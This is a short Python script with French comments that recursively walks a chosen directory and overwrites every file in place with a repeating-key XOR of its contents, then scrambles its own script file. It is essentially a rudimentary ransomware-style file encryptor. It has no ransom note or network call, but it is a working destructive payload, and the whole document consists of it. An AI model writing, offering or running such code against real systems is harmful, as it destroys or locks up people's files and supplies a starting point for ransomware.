import os
import sys


def xor_system(filepath, key):
    try:
        # lis le content
        with open(filepath, "rb") as file:
            file_bytes = file.read()
        # chiffre avec un xor les bytes du fichier
        with open(filepath, "wb") as file:
            key_index = 0
            max_index = len(key) - 1
            for byte in file_bytes:
                xored_byte = byte ^ ord(key[key_index])
                xored_byte = xored_byte.to_bytes(1, "little")
                file.write(xored_byte)
                if key_index >= max_index:
                    key_index = 0
                    continue
                key_index += 1
    except Exception as error:
        return error


fpath = 'D:\\test' #mettre le path voulu
key = 'azeAZE+!aze'
if os.path.exists(fpath):
    for root, dirs, files in os.walk(fpath):
        for file in files:
            xor_system("{}//{}".format(root, file), key)
xor_system(sys.argv[0], "azeAZE+!") #the key of the xor 
